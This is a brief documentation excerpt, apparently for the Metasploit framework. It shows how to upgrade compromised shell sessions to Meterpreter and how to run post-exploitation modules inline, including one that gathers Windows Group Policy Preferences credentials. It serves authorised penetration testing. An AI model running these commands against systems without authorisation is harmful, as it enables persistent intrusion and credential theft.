## Upgrading shells to Meterpreter

To upgrade a specific session to Meterpreter:

```
sessions -u 3
```

To upgrade the most recently opened session to Meterpreter using the `sessions` command:

```
sessions -u -1
```

Or run the `shell_to_meterpreter` module manually:

```
use multi/manage/shell_to_meterpreter
run session=-1
run session=-1 win_transfer=POWERSHELL
run session=-1 win_transfer=VBS
```

## Post Modules

Providing inline options also works for post modules:

```
use auxiliary/windows/gather/credentials/gpp
run session=-1
```

